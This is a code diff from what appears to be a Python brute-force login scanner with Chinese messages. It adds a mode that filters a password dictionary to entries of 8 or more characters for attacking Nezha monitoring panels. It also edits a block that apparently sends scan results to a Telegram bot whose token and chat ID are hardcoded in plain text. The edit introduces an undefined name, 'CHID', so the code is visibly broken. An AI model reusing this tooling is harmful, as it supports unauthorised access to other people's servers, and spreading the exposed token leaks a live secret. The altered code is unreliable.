@@ -1838,6 +1838,18 @@ def load_credentials(template_mode, auth_mode=0):
             usernames = [line.strip() for line in f if line.strip()]
         with open("password.txt", 'r', encoding='utf-8-sig', errors='ignore') as f:
             passwords = [line.strip() for line in f if line.strip()]
+
+        # 针对哪吒模式进行特殊处理
+        if template_mode == 2:
+            print("ℹ️  检测到哪吒面板模式，将自动过滤长度小于8的密码...")
+            original_pass_count = len(passwords)
+            passwords = [p for p in passwords if len(p) >= 8]
+            print(f"  - 过滤完成，保留了 {len(passwords)}/{original_pass_count} 个密码。")
+            if not passwords:
+                print("❌ 错误: 过滤后，密码字典中没有剩余长度大于或等于8的密码。")
+                print("   哪吒面板要求密码至少为8个字符，无法继续扫描。")
+                sys.exit(1)
+
         if not usernames or not passwords:
             print("❌ 错误: 用户名或密码文件为空。")
             sys.exit(1)
@@ -2290,7 +2302,7 @@ if __name__ == "__main__":
             BOT_TOKEN = "7664203362:AAFTBPQ8Ydl9c1fqM53CSzKIPS0VBj99r0M"
             CHAT_ID = "7697235358"
 
-            if BOT_TOKEN and CHAT_ID:
+            if BOT_TOKEN and CHID:
                 files_to_send = []
                 final_txt_file = "{}-{}.txt".format(prefix, time_str)
                 final_xlsx_file = "{}-{}.xlsx".format(prefix, time_str)
